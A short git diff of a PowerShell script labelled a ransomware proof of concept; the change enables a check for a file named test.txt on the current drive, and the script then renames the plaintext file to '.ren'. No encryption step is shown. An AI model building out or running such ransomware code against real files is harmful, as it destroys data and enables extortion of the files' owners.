@@ -1,9 +1,9 @@
 # BTBit Powershell Ransomware PoC 
 # file to encrypt
 $file = "test.txt"
-#$drive = (get-location).Drive.Name
-#$file_exist = $drive + ":\" + $file
-#if (-not(Test-Path -Path $file_exist -PathType Leaf)) { exit }
+$drive = (get-location).Drive.Name
+$file_exist = "$drive" + ":\" + "$file"
+if (-not(Test-Path -Path $file_exist -PathType Leaf)) { exit }
 #
 # remove the clear file from the disk
 mv "$file" "$file.ren"
